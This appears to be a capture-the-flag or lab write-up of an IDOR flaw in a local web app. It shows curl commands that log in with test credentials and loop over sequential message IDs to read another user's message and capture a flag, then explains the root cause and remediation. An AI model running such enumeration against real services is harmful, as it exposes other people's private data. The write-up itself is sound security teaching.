# Finding 2: IDOR — Reading Other Users' Messages

**Flag:** `FLAG{idor_92fa26197dee}`

## Steps

1. Logged in as the provided test account `alice / password123` and viewed
   `/messages`:
   ```
   curl -c cookies.txt -X POST http://127.0.0.1:5050/login -d "username=alice&password=password123"
   curl -b cookies.txt http://127.0.0.1:5050/messages
   ```
   Alice's own message list only shows IDs `#4` and `#5`.

2. The message detail page is `/messages/<id>` with a plain sequential
   integer and no visible ownership check. Enumerated nearby IDs while still
   authenticated as alice:
   ```
   for id in 1 2 3 4 5 6 7 8; do
     curl -b cookies.txt "http://127.0.0.1:5050/messages/$id"
   done
   ```

3. `/messages/1` — a message **not** in alice's own list (`#1 — Onboarding
   secret`) — rendered successfully instead of returning 403/404:
   ```
   #1 — Onboarding secret
   Internal only. Do not share. FLAG{idor_92fa26197dee}
   ```

## Root cause
`/messages/<id>` fetches and renders a message by ID without checking that
the message belongs to the currently authenticated user. Any authenticated
user can read any other user's message by guessing/incrementing the ID
(classic Insecure Direct Object Reference).

## Remediation
- On every object-detail route, check that `message.owner_id == current_user.id`
  (or equivalent) server-side before returning the record; return 403/404
  otherwise (and avoid leaking existence via differing error messages).
- Prefer non-guessable identifiers (UUIDs) for sensitive resources as a
  defense-in-depth measure, though the authorization check above is the
  actual fix.
- Add tests that assert cross-user access is rejected for every
  object-scoped route.
